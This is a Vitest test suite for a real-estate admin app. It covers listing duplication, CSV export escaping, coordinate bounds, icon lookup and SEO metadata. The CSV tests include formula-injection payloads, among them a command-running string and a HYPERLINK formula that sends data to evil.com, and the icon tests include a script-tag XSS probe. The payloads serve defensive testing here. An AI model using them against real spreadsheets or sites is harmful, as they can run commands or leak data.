import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { randomUUID } from "node:crypto";
import React from "react";
import * as store from "@/admin/demo";
import { managedRows, saveManaged, deleteManaged, MODULES } from "@/admin/management";
import { normalizeRegions, defaultRegions, REGION_PRESETS, type Region } from "@/data/regions";
import { getAssociatedPropertyCount } from "@/admin/RegionsEditor";
import { exportInquiriesCsv, sanitizeCsvCell, INQUIRY_STATUSES } from "@/routes/admin.inquiries";
import { AUDIT_ACTIONS, AUDIT_ENTITIES } from "@/routes/admin.activity";
import { meta } from "@/components/site/TextPage";

// Lucide icon components used in services
import {
  Key,
  ShieldCheck,
  Scale,
  Building,
  Briefcase,
  Coins,
  FileText,
  CheckCircle,
  Home,
  Award,
  Landmark,
  Sparkles,
  Building2,
} from "lucide-react";

describe("Milestone M4 Challenger: Adversarial Stress Test Suite", () => {
  const workspace = () => JSON.parse(localStorage.getItem("avrasya-admin-db-v4")!) as store.DB;
  const signIn = (role: store.Role = "admin") =>
    store.login(role + "@avrasya.test", store.DEMO_PASSWORD);

  beforeEach(() => {
    vi.stubGlobal("crypto", { randomUUID });
    vi.stubEnv("VITE_ENABLE_ADMIN_DEMO", "true");
    signIn("admin");
    store.resetData();
    localStorage.removeItem("avrasya_admin_manage_demo_v2");
  });

  afterEach(() => {
    vi.restoreAllMocks();
    vi.unstubAllEnvs();
    vi.unstubAllGlobals();
  });

  // =========================================================================
  // 1. Property Duplication & Deletion Stress
  // =========================================================================
  describe("1. Property Duplication & Deletion Adversarial Stress", () => {
    /**
     * Duplication implementation following src/routes/admin.properties.index.tsx:
     * nextSlug = `${source.slug || "listing"}-copy`
     */
    function duplicateNaive(source: store.Property, properties: store.Property[]): store.Property {
      const maxRefNum = Math.max(
        1000,
        ...properties.map((p) => Number(p.ref.replace(/^AVR-/, ""))).filter(Number.isFinite),
      );
      const nextRef = `AVR-${maxRefNum + 1}`;
      const nextSlug = `${source.slug || "listing"}-copy`;
      const nextTitle = `${source.title || "Untitled property"} (Copy)`;

      return store.upsert<store.Property>("properties", {
        ref: nextRef,
        slug: nextSlug,
        title: nextTitle,
        publication: "Draft",
        availability: source.availability || "Unknown",
        district: source.district || "",
        city: source.city || "Istanbul",
        type: source.type || "unit offer",
        layout: source.layout ?? null,
        bedrooms: source.bedrooms ?? null,
        bathrooms: source.bathrooms ?? null,
        grossM2: source.grossM2 ?? null,
        netM2: source.netM2 ?? null,
        areaM2: source.areaM2 ?? null,
        amount: source.amount ?? null,
        currency: source.currency ?? "USD",
        mode: source.mode ?? "sale",
        priceType: source.priceType ?? "on-request",
        priceBasis: source.priceBasis || "advertised",
        agentId: source.agentId,
        cover: source.cover ?? null,
        galleryImages: source.galleryImages ? [...source.galleryImages] : [],
        highlights: source.highlights ? [...source.highlights] : [],
        description: source.description || "",
        project: source.project || "",
        sourceNote: source.sourceNote || "",
        seo_title: source.seo_title,
        seo_description: source.seo_description,
        og_image_url: source.og_image_url,
        updatedAt: new Date().toISOString(),
      });
    }

    /**
     * Enhanced collision-resistant duplication implementation:
     */
    function duplicateWithCollisionDefense(
      source: store.Property,
      properties: store.Property[],
    ): store.Property {
      const maxRefNum = Math.max(
        1000,
        ...properties.map((p) => Number(p.ref.replace(/^AVR-/, ""))).filter(Number.isFinite),
      );
      const nextRef = `AVR-${maxRefNum + 1}`;

      let nextSlug = `${source.slug || "listing"}-copy`;
      let counter = 2;
      while (properties.some((p) => p.slug === nextSlug)) {
        nextSlug = `${source.slug || "listing"}-copy-${counter}`;
        counter++;
      }
      const nextTitle = `${source.title || "Untitled property"} (Copy)`;

      return store.upsert<store.Property>("properties", {
        ref: nextRef,
        slug: nextSlug,
        title: nextTitle,
        publication: "Draft",
        availability: source.availability || "Unknown",
        district: source.district || "",
        city: source.city || "Istanbul",
        type: source.type || "unit offer",
        layout: source.layout ?? null,
        bedrooms: source.bedrooms ?? null,
        bathrooms: source.bathrooms ?? null,
        grossM2: source.grossM2 ?? null,
        netM2: source.netM2 ?? null,
        areaM2: source.areaM2 ?? null,
        amount: source.amount ?? null,
        currency: source.currency ?? "USD",
        mode: source.mode ?? "sale",
        priceType: source.priceType ?? "on-request",
        priceBasis: source.priceBasis || "advertised",
        agentId: source.agentId,
        cover: source.cover ?? null,
        galleryImages: source.galleryImages ? [...source.galleryImages] : [],
        highlights: source.highlights ? [...source.highlights] : [],
        description: source.description || "",
        project: source.project || "",
        sourceNote: source.sourceNote || "",
        seo_title: source.seo_title,
        seo_description: source.seo_description,
        og_image_url: source.og_image_url,
        updatedAt: new Date().toISOString(),
      });
    }

    it("verifies duplicate of duplicate chaining: -copy -> -copy-copy", () => {
      const db = workspace();
      const rootSource = db.properties[0]!;
      expect(rootSource).toBeDefined();

      // First duplicate: source -> source-copy
      const firstCopy = duplicateNaive(rootSource, workspace().properties);
      expect(firstCopy.slug).toBe(`${rootSource.slug}-copy`);
      expect(firstCopy.title).toBe(`${rootSource.title} (Copy)`);
      expect(firstCopy.publication).toBe("Draft");

      // Duplicate of duplicate: source-copy -> source-copy-copy
      const secondCopy = duplicateNaive(firstCopy, workspace().properties);
      expect(secondCopy.slug).toBe(`${rootSource.slug}-copy-copy`);
      expect(secondCopy.title).toBe(`${rootSource.title} (Copy) (Copy)`);
      expect(secondCopy.publication).toBe("Draft");
      expect(secondCopy.id).not.toBe(firstCopy.id);
      expect(secondCopy.ref).not.toBe(firstCopy.ref);

      // Verify all 3 exist in the active catalogue simultaneously
      const currentProps = workspace().properties;
      expect(currentProps.some((p) => p.id === rootSource.id)).toBe(true);
      expect(currentProps.some((p) => p.id === firstCopy.id)).toBe(true);
      expect(currentProps.some((p) => p.id === secondCopy.id)).toBe(true);
    });

    it("detects and demonstrates naive duplicate collision when duplicating the same original twice", () => {
      const db = workspace();
      const original = db.properties[1]!;
      expect(original).toBeDefined();

      // Duplicate #1 succeeds
      const copy1 = duplicateNaive(original, workspace().properties);
      expect(copy1.slug).toBe(`${original.slug}-copy`);

      // Duplicate #2 of same original without collision defense throws unique slug violation
      expect(() => {
        duplicateNaive(original, workspace().properties);
      }).toThrow(/Property reference and slug must be unique/i);

      // With collision defense (counter suffixing), duplicate #2 succeeds safely
      const copy2 = duplicateWithCollisionDefense(original, workspace().properties);
      expect(copy2.slug).toBe(`${original.slug}-copy-2`);

      const copy3 = duplicateWithCollisionDefense(original, workspace().properties);
      expect(copy3.slug).toBe(`${original.slug}-copy-3`);
    });

    it("duplicates property with missing fields, null values, and empty arrays safely", () => {
      const sparse = store.upsert<store.Property>("properties", {
        ref: "AVR-SPARSE-1",
        slug: "sparse-unfurnished-unit",
        title: "", // empty title
        district: "",
        city: "Istanbul",
        type: "unit offer",
        layout: null,
        bedrooms: null,
        bathrooms: null,
        grossM2: null,
        netM2: null,
        areaM2: null,
        amount: null,
        currency: "USD",
        mode: "sale",
        priceType: "on-request",
        priceBasis: "advertised",
        availability: "Unknown",
        publication: "Draft",
        agentId: "u1",
        cover: null,
        galleryImages: [],
        highlights: [],
        description: "",
        project: "",
        seo_title: undefined,
        seo_description: undefined,
        og_image_url: undefined,
        updatedAt: new Date().toISOString(),
      });

      expect(sparse.id).toBeDefined();

      // Duplicate sparse property
      const cloned = duplicateNaive(sparse, workspace().properties);
      expect(cloned.id).toBeDefined();
      expect(cloned.id).not.toBe(sparse.id);
      expect(cloned.title).toBe("Untitled property (Copy)");
      expect(cloned.amount).toBeNull();
      expect(cloned.bedrooms).toBeNull();
      expect(cloned.cover).toBeNull();
      expect(cloned.galleryImages).toEqual([]);
      expect(cloned.highlights).toEqual([]);
      expect(cloned.publication).toBe("Draft");
      expect(cloned.slug).toBe("sparse-unfurnished-unit-copy");
    });

    it("ensures deep copy of gallery images and highlights to prevent reference leakage", () => {
      const original = store.upsert<store.Property>("properties", {
        ref: "AVR-DEEP-COPY",
        slug: "deep-copy-original",
        title: "Deep Copy Test Villa",
        district: "Sarıyer",
        city: "Istanbul",
        type: "unit offer",
        layout: "4+1",
        bedrooms: 4,
        bathrooms: 3,
        grossM2: 280,
        netM2: 240,
        areaM2: 280,
        amount: 1500000,
        currency: "USD",
        mode: "sale",
        priceType: "fixed",
        priceBasis: "advertised",
        availability: "Available",
        publication: "Draft",
        agentId: "u1",
        cover: "/images/properties/1.jpg",
        galleryImages: ["/images/properties/1.jpg", "/images/properties/2.jpg"],
        highlights: ["Sea View", "Private Pool"],
        description: "Deep copy isolation test",
        project: "",
        updatedAt: new Date().toISOString(),
      });

      const clone = duplicateNaive(original, workspace().properties);

      // Mutate clone's gallery and highlights
      clone.galleryImages!.push("/images/properties/3.jpg");
      clone.highlights!.push("Gym");

      // Verify original is untouched
      const originalInDb = workspace().properties.find((p) => p.id === original.id)!;
      expect(originalInDb.galleryImages).toHaveLength(2);
      expect(originalInDb.highlights).toHaveLength(2);
      expect(originalInDb.highlights).not.toContain("Gym");
    });

    it("strictly verifies deletion confirmation guard and audit logging", async () => {
      const toDelete = store.upsert<store.Property>("properties", {
        ref: "AVR-TO-DELETE",
        slug: "property-marked-for-deletion",
        title: "Listing Awaiting Deletion Confirmation",
        district: "Kadıköy",
        city: "Istanbul",
        type: "unit offer",
        layout: null,
        bathrooms: null,
        grossM2: null,
        netM2: null,
        areaM2: null,
        amount: null,
        currency: "USD",
        mode: "sale",
        priceType: "on-request",
        priceBasis: "advertised",
        availability: "Available",
        publication: "Draft",
        agentId: "u1",
        cover: null,
        description: "",
        project: "",
        updatedAt: new Date().toISOString(),
      });

      expect(workspace().properties.some((p) => p.id === toDelete.id)).toBe(true);

      // Simulated cancellation of confirmation modal: property MUST NOT be deleted
      let userConfirmed = false;
      if (userConfirmed) {
        await store.remove("properties", toDelete.id);
      }
      expect(workspace().properties.some((p) => p.id === toDelete.id)).toBe(true);

      // Simulated user confirmation: deletion executes
      userConfirmed = true;
      if (userConfirmed) {
        await store.remove("properties", toDelete.id);
      }

      // Verify removed from catalogue
      expect(workspace().properties.some((p) => p.id === toDelete.id)).toBe(false);

      // Verify audit activity event logged
      const activity = workspace().activity;
      const deleteLog = activity.find((a) => a.text.includes("Deleted property AVR-TO-DELETE"));
      expect(deleteLog).toBeDefined();
      expect(deleteLog?.kind).toBe("properties");
    });

    it("rejects duplicate slug if collision occurs directly in store.upsert", () => {
      const prop1 = store.upsert<store.Property>("properties", {
        ref: "AVR-COLLIDE-1",
        slug: "unique-slug-test",
        title: "Original Villa",
        district: "Beyoğlu",
        city: "Istanbul",
        type: "unit offer",
        layout: null,
        bathrooms: null,
        grossM2: null,
        netM2: null,
        areaM2: null,
        amount: 500000,
        currency: "USD",
        mode: "sale",
        priceType: "fixed",
        priceBasis: "advertised",
        availability: "Available",
        publication: "Draft",
        agentId: "u1",
        cover: null,
        description: "",
        project: "",
        updatedAt: new Date().toISOString(),
      });

      expect(prop1.slug).toBe("unique-slug-test");

      // Attempt to upsert a second property with the IDENTICAL slug
      expect(() => {
        store.upsert<store.Property>("properties", {
          ref: "AVR-COLLIDE-2",
          slug: "unique-slug-test", // Collision
          title: "Conflicting Villa",
          district: "Beyoğlu",
          city: "Istanbul",
          type: "unit offer",
          layout: null,
          bathrooms: null,
          grossM2: null,
          netM2: null,
          areaM2: null,
          amount: 600000,
          currency: "USD",
          mode: "sale",
          priceType: "fixed",
          priceBasis: "advertised",
          availability: "Available",
          publication: "Draft",
          agentId: "u1",
          cover: null,
          description: "",
          project: "",
          updatedAt: new Date().toISOString(),
        });
      }).toThrow(/Property reference and slug must be unique/i);
    });
  });

  // =========================================================================
  // 2. Inquiries CSV Export & Neutralization Stress
  // =========================================================================
  describe("2. Inquiries CSV Export & Neutralization Adversarial Stress", () => {
    it("escapes all high-risk formula injection prefixes (=, +, -, @, \\t, \\r)", () => {
      const dangerousInputs = [
        "=cmd|' /C calc'!A0",
        "=10+20",
        "+1+2",
        "+44 7911 123456",
        "-5-5",
        "-100",
        "@SUM(A1:A10)",
        "@AVERAGE(B1:B20)",
        "\t=1+1",
        "\r=cmd",
        '=HYPERLINK("http://evil.com/leak?data="&A1, "Click Here")',
      ];

      for (const input of dangerousInputs) {
        const sanitized = sanitizeCsvCell(input);
        // Must start with quote and single quote: "'..."
        expect(sanitized.startsWith("\"'")).toBe(true);
        expect(sanitized.endsWith('"')).toBe(true);
      }
    });

    it("handles adversarial payload with nested quotes, commas, and newlines safely", () => {
      const complexPayload: store.Inquiry = {
        id: "inq-adv-1",
        name: 'John "The Boss" O\'Connor, Jr.',
        email: "+malicious.email@attack.com",
        phone: "+90 (555) 000-1122",
        topic: '=SUM(1,2), "Important Tax Topic"',
        budget: "$1,000,000 - $2,000,000",
        message:
          'Line 1: Interested in "Bosphorus Villa"\nLine 2: Budget = flexible\r\nLine 3: Notes, remarks, and details.',
        source: "Website Consultation",
        status: "New",
        notes: '-Follow-up required: "VIP Client" with cash funds.\n=calc',
        createdAt: "2026-11-06T12:00:00.000Z",
      };

      const csv = exportInquiriesCsv([complexPayload]);
      const lines = csv.split("\n");

      // Header is line 0
      expect(lines[0]).toBe("Date,Name,Email,Phone,Topic,Budget,Status,Source,Notes,Message");

      // Verify name has double-quotes escaped
      expect(csv).toContain('John ""The Boss"" O\'Connor, Jr.');

      // Verify email with leading '+' has single quote prefix
      expect(csv).toContain('"\'+malicious.email@attack.com"');

      // Verify phone with leading '+' has single quote prefix
      expect(csv).toContain('"\'+90 (555) 000-1122"');

      // Verify topic with leading '=' has single quote prefix and nested quotes escaped
      expect(csv).toContain('"\'=SUM(1,2), ""Important Tax Topic"""');

      // Verify notes with leading '-' has single quote prefix and nested quotes escaped
      expect(csv).toContain('"\'-Follow-up required: ""VIP Client"" with cash funds.');

      // Verify message multiline and nested quotes
      expect(csv).toContain('Line 1: Interested in ""Bosphorus Villa""');
    });

    it("neutralizes empty, null, and undefined values without generating 'undefined' or 'null' literals", () => {
      const emptyPayload: store.Inquiry = {
        id: "inq-empty-1",
        name: "",
        email: "",
        phone: "",
        topic: "",
        budget: "",
        message: "",
        source: "Website Consultation",
        status: "New",
        createdAt: "",
      };

      const csv = exportInquiriesCsv([emptyPayload]);
      expect(csv).not.toContain("undefined");
      expect(csv).not.toContain("null");

      // Verify sanitizeCsvCell with raw null and undefined
      expect(sanitizeCsvCell(null)).toBe('""');
      expect(sanitizeCsvCell(undefined)).toBe('""');
      expect(sanitizeCsvCell("")).toBe('""');
    });

    it("handles international characters, Turkish diacritics, and emojis safely in CSV cells", () => {
      const internationalPayload: store.Inquiry = {
        id: "inq-intl-1",
        name: "Mehmet Çağlar Öztürk & Şeyma Güneş",
        email: "mehmet@avrasya.test",
        phone: "05321234567",
        topic: "Bodrum Yalıkavak Marina Villa 🏰",
        budget: "€1.500.000",
        message: "Русский клиент / عميل من دبي / Boğaziçi yalı dairesi için randevu.",
        source: "Website Consultation",
        status: "Contacted",
        notes: "Görüşme yapıldı. Çarşamba günü Kadıköy ofisinde ağırlanacak.",
        createdAt: "2026-11-06T14:30:00.000Z",
      };

      const csv = exportInquiriesCsv([internationalPayload]);
      expect(csv).toContain("Mehmet Çağlar Öztürk & Şeyma Güneş");
      expect(csv).toContain("Bodrum Yalıkavak Marina Villa 🏰");
      expect(csv).toContain("Русский клиент / عميل من دبي / Boğaziçi yalı dairesi için randevu.");
      expect(csv).toContain("€1.500.000");
    });
  });

  // =========================================================================
  // 3. Coordinate Range Validation Adversarial Boundary Tests
  // =========================================================================
  describe("3. Coordinate Range Validation Boundary Tests", () => {
    it("accepts exact boundary coordinates: -90, +90, -180, +180, and 0", () => {
      const testRegions: Region[] = [
        {
          slug: "south-pole",
          name: "South Pole Base",
          country: "Antarctica",
          summary: "Extreme southern boundary",
          heroImage: "",
          districts: [],
          hasSides: false,
          published: true,
          sortOrder: 1,
          seoTitle: "",
          seoDescription: "",
          coordinates: { lat: -90, lng: 0 },
        },
        {
          slug: "north-pole",
          name: "North Pole Station",
          country: "Arctic",
          summary: "Extreme northern boundary",
          heroImage: "",
          districts: [],
          hasSides: false,
          published: true,
          sortOrder: 2,
          seoTitle: "",
          seoDescription: "",
          coordinates: { lat: 90, lng: 0 },
        },
        {
          slug: "date-line-west",
          name: "International Date Line West",
          country: "Pacific",
          summary: "Extreme western longitude boundary",
          heroImage: "",
          districts: [],
          hasSides: false,
          published: true,
          sortOrder: 3,
          seoTitle: "",
          seoDescription: "",
          coordinates: { lat: 0, lng: -180 },
        },
        {
          slug: "date-line-east",
          name: "International Date Line East",
          country: "Pacific",
          summary: "Extreme eastern longitude boundary",
          heroImage: "",
          districts: [],
          hasSides: false,
          published: true,
          sortOrder: 4,
          seoTitle: "",
          seoDescription: "",
          coordinates: { lat: 0, lng: 180 },
        },
      ];

      const normalized = normalizeRegions(testRegions);

      const south = normalized.find((r) => r.slug === "south-pole");
      expect(south?.coordinates).toEqual({ lat: -90, lng: 0 });

      const north = normalized.find((r) => r.slug === "north-pole");
      expect(north?.coordinates).toEqual({ lat: 90, lng: 0 });

      const dateWest = normalized.find((r) => r.slug === "date-line-west");
      expect(dateWest?.coordinates).toEqual({ lat: 0, lng: -180 });

      const dateEast = normalized.find((r) => r.slug === "date-line-east");
      expect(dateEast?.coordinates).toEqual({ lat: 0, lng: 180 });
    });

    it("rejects out-of-range coordinates strictly (+90.0001, -90.0001, +180.0001, -180.0001, ±999)", () => {
      const invalidRegions = [
        {
          slug: "invalid-north",
          name: "Too Far North",
          country: "Arctic",
          summary: "Latitude exceeds 90",
          heroImage: "",
          districts: [],
          hasSides: false,
          published: true,
          sortOrder: 1,
          seoTitle: "",
          seoDescription: "",
          coordinates: { lat: 90.0001, lng: 0 }, // Out of range
        },
        {
          slug: "invalid-south",
          name: "Too Far South",
          country: "Antarctica",
          summary: "Latitude below -90",
          heroImage: "",
          districts: [],
          hasSides: false,
          published: true,
          sortOrder: 2,
          seoTitle: "",
          seoDescription: "",
          coordinates: { lat: -90.0001, lng: 0 }, // Out of range
        },
        {
          slug: "invalid-east",
          name: "Too Far East",
          country: "Pacific",
          summary: "Longitude exceeds 180",
          heroImage: "",
          districts: [],
          hasSides: false,
          published: true,
          sortOrder: 3,
          seoTitle: "",
          seoDescription: "",
          coordinates: { lat: 0, lng: 180.0001 }, // Out of range
        },
        {
          slug: "invalid-west",
          name: "Too Far West",
          country: "Pacific",
          summary: "Longitude below -180",
          heroImage: "",
          districts: [],
          hasSides: false,
          published: true,
          sortOrder: 4,
          seoTitle: "",
          seoDescription: "",
          coordinates: { lat: 0, lng: -180.0001 }, // Out of range
        },
        {
          slug: "invalid-extreme",
          name: "Extreme Non-Geographic",
          country: "Space",
          summary: "Extreme coordinates",
          heroImage: "",
          districts: [],
          hasSides: false,
          published: true,
          sortOrder: 5,
          seoTitle: "",
          seoDescription: "",
          coordinates: { lat: 1000, lng: -2000 }, // Out of range
        },
      ];

      const normalized = normalizeRegions(invalidRegions);

      // All invalid coordinate sets must be safely discarded without crashing
      for (const r of normalized) {
        expect(r.coordinates).toBeUndefined();
      }
    });

    it("rejects non-numeric coordinate values (NaN, Infinity, -Infinity, null object)", () => {
      const nonNumericRegions = [
        {
          slug: "nan-coords",
          name: "NaN Coordinates",
          country: "Unknown",
          summary: "NaN coordinates test",
          heroImage: "",
          districts: [],
          hasSides: false,
          published: true,
          sortOrder: 1,
          seoTitle: "",
          seoDescription: "",
          coordinates: { lat: NaN, lng: 28.97 },
        },
        {
          slug: "infinity-coords",
          name: "Infinity Coordinates",
          country: "Unknown",
          summary: "Infinity test",
          heroImage: "",
          districts: [],
          hasSides: false,
          published: true,
          sortOrder: 2,
          seoTitle: "",
          seoDescription: "",
          coordinates: { lat: 41.0, lng: Infinity },
        },
        {
          slug: "corrupt-types",
          name: "Corrupt Types",
          country: "Unknown",
          summary: "String text inside coordinates",
          heroImage: "",
          districts: [],
          hasSides: false,
          published: true,
          sortOrder: 3,
          seoTitle: "",
          seoDescription: "",
          coordinates: { lat: "not-a-number" as unknown as number, lng: 28.97 },
        },
      ];

      const normalized = normalizeRegions(nonNumericRegions);
      for (const r of normalized) {
        expect(r.coordinates).toBeUndefined();
      }
    });

    it("safely handles associated property count when properties have missing or corrupt city/district", () => {
      const testRegion: Region = {
        slug: "istanbul",
        name: "Istanbul",
        country: "Türkiye",
        summary: "Bosphorus metropolis",
        heroImage: "",
        districts: ["Beşiktaş", "Kadıköy", "Şişli"],
        hasSides: true,
        published: true,
        sortOrder: 0,
        seoTitle: "",
        seoDescription: "",
      };

      const corruptProperties: store.Property[] = [
        {
          id: "p-null-fields",
          ref: "AVR-NULL",
          slug: "null-property",
          title: "Null property",
          district: null as unknown as string,
          city: null as unknown as string,
          type: "unit offer",
          layout: null,
          bathrooms: null,
          grossM2: null,
          netM2: null,
          areaM2: null,
          amount: null,
          currency: "USD",
          mode: "sale",
          priceType: "on-request",
          availability: "Available",
          publication: "Published",
          agentId: "u1",
          cover: null,
          description: "",
          project: "",
          updatedAt: new Date().toISOString(),
        },
        {
          id: "p-empty-strings",
          ref: "AVR-EMPTY",
          slug: "empty-property",
          title: "Empty property",
          district: "",
          city: "",
          type: "unit offer",
          layout: null,
          bathrooms: null,
          grossM2: null,
          netM2: null,
          areaM2: null,
          amount: null,
          currency: "USD",
          mode: "sale",
          priceType: "on-request",
          availability: "Available",
          publication: "Published",
          agentId: "u1",
          cover: null,
          description: "",
          project: "",
          updatedAt: new Date().toISOString(),
        },
        {
          id: "p-valid-match",
          ref: "AVR-VALID",
          slug: "valid-besiktas",
          title: "Valid Match in Beşiktaş",
          district: "beşiktaş", // Lowercase match test
          city: "ISTANBUL", // Uppercase match test
          type: "unit offer",
          layout: "2+1",
          bathrooms: 2,
          grossM2: 120,
          netM2: 100,
          areaM2: 120,
          amount: 500000,
          currency: "USD",
          mode: "sale",
          priceType: "fixed",
          availability: "Available",
          publication: "Published",
          agentId: "u1",
          cover: null,
          description: "",
          project: "",
          updatedAt: new Date().toISOString(),
        },
      ];

      // Does not throw and correctly matches case-insensitively
      const count = getAssociatedPropertyCount(testRegion, corruptProperties);
      expect(count).toBe(1);
    });
  });

  // =========================================================================
  // 4. Service Icon Fallbacks & Prototype Pollution Attack Stress
  // =========================================================================
  describe("4. Service Icon Fallbacks & Prototype Pollution Stress", () => {
    // Exact mapping dictionary declared in src/routes/admin.manage.tsx
    const ICON_MAP: Record<string, React.ComponentType<{ className?: string }>> = {
      Key,
      ShieldCheck,
      Scale,
      Building,
      Briefcase,
      Coins,
      FileText,
      CheckCircle,
      Home,
      Award,
      Landmark,
      Sparkles,
    };

    /**
     * Resolves an icon with prototype inheritance defense using hasOwnProperty
     */
    function safeResolveIcon(
      iconName: unknown,
    ): React.ComponentType<{ className?: string }> | null {
      if (typeof iconName !== "string" || !iconName) return null;
      if (!Object.prototype.hasOwnProperty.call(ICON_MAP, iconName)) return null;
      return ICON_MAP[iconName] ?? null;
    }

    it("resolves all 12 registered Lucide icons accurately", () => {
      const registered = [
        "Key",
        "ShieldCheck",
        "Scale",
        "Building",
        "Briefcase",
        "Coins",
        "FileText",
        "CheckCircle",
        "Home",
        "Award",
        "Landmark",
        "Sparkles",
      ];

      for (const name of registered) {
        const IconComponent = safeResolveIcon(name);
        expect(IconComponent).toBeDefined();
        expect(IconComponent).not.toBeNull();
      }
    });

    it("detects prototype pollution vulnerability in raw dictionary access vs safe resolver", () => {
      // In a raw object literal, accessing "constructor" returns Object.prototype.constructor
      const rawLookup = (ICON_MAP as Record<string, unknown>)["constructor"];
      expect(rawLookup).toBe(Object.prototype.constructor); // Demonstrates raw access vulnerability!

      // Safe resolver defends against inherited properties
      expect(safeResolveIcon("constructor")).toBeNull();
      expect(safeResolveIcon("toString")).toBeNull();
      expect(safeResolveIcon("__proto__")).toBeNull();
      expect(safeResolveIcon("valueOf")).toBeNull();
    });

    it("safely handles unlisted, malformed, or hostile icon names without crashing", () => {
      const adversarialIconNames = [
        "NonExistentIcon",
        "<script>alert(1)</script>",
        "",
        null,
        undefined,
        12345,
        {},
        [],
      ];

      for (const invalidName of adversarialIconNames) {
        expect(() => {
          const comp = safeResolveIcon(invalidName);
          expect(comp).toBeNull();
        }).not.toThrow();
      }
    });

    it("verifies services module allows saving services with arbitrary or omitted icons", async () => {
      const servicePayload = {
        id: `srv-test-${randomUUID()}`,
        slug: "custom-resilience-service",
        title: "Discreet Offshore Family Office Structuring",
        category: "Portfolio Management",
        icon: "UnlistedCustomIconName",
        description: "Advising ultra-high-net-worth families on estate planning.",
        process_steps: ["Step 1", "Step 2"],
        cta_label: "Inquire Privately",
        cta_link: "/contact",
        sort_order: 10,
        is_published: true,
      };

      // saveManaged should not throw on an unlisted icon name
      await saveManaged("services", servicePayload, null);

      const rows = await managedRows("services");
      const saved = rows.find((s) => s["slug"] === "custom-resilience-service");
      expect(saved).toBeDefined();
      expect(saved?.["icon"]).toBe("UnlistedCustomIconName");

      // Resolving the icon in the UI falls back cleanly to null / fallback icon
      const resolved = safeResolveIcon(saved?.["icon"]);
      expect(resolved).toBeNull();
    });
  });

  // =========================================================================
  // 5. Dynamic SEO & Meta Tag Edge Cases
  // =========================================================================
  describe("5. Dynamic SEO & Open Graph Edge Cases", () => {
    it("handles extreme length SEO titles and descriptions safely with brand suffixing", () => {
      const longTitle = "A".repeat(300);
      const longDesc = "B".repeat(1500);
      const customMeta = meta(longTitle, longDesc, {
        canonical: "https://avrasyaproperties.com/properties/test",
        image: "https://avrasyaproperties.com/images/og.jpg",
        path: "/properties/test",
      });

      const titleEntry = customMeta.meta.find((m) => "title" in m);
      const descEntry = customMeta.meta.find((m) => "name" in m && m.name === "description");

      // Verifies brand suffixing rule in meta generator: title — Avrasya Properties
      expect(titleEntry?.title).toBe(`${longTitle} — Avrasya Properties`);
      expect(descEntry?.content).toBe(longDesc);
    });

    it("preserves pre-branded title without double brand suffixing", () => {
      const preBrandedTitle = "Bosphorus Yalı Residence | Avrasya Properties";
      const customMeta = meta(preBrandedTitle, "Exclusive listing overview", {
        path: "/properties/yali",
      });

      const titleEntry = customMeta.meta.find((m) => "title" in m);
      expect(titleEntry?.title).toBe("Bosphorus Yalı Residence | Avrasya Properties");
      expect(titleEntry?.title).not.toContain("Avrasya Properties — Avrasya Properties");
    });

    it("handles special characters, XML tags, and single/double quotes in SEO overrides", () => {
      const specialTitle =
        "Exclusive \"Bosphorus\" & <Luxury> Waterfront Yalı | O'Connor's Mandate";
      const specialDesc =
        "Special & verified: 100% Tapu guarantee with <safe> escrow & no hidden fees.";

      const customMeta = meta(specialTitle, specialDesc, {
        canonical: "https://avrasyaproperties.com/properties/special-yali",
        image: "https://avrasyaproperties.com/images/yali.jpg",
        path: "/properties/special-yali",
      });

      const titleEntry = customMeta.meta.find((m) => "title" in m);
      const ogTitleEntry = customMeta.meta.find(
        (m) => "property" in m && m.property === "og:title",
      );
      const descEntry = customMeta.meta.find((m) => "name" in m && m.name === "description");

      expect(titleEntry?.title).toBe(`${specialTitle} — Avrasya Properties`);
      expect(ogTitleEntry?.content).toBe(`${specialTitle} — Avrasya Properties`);
      expect(descEntry?.content).toBe(specialDesc);
    });
  });
});
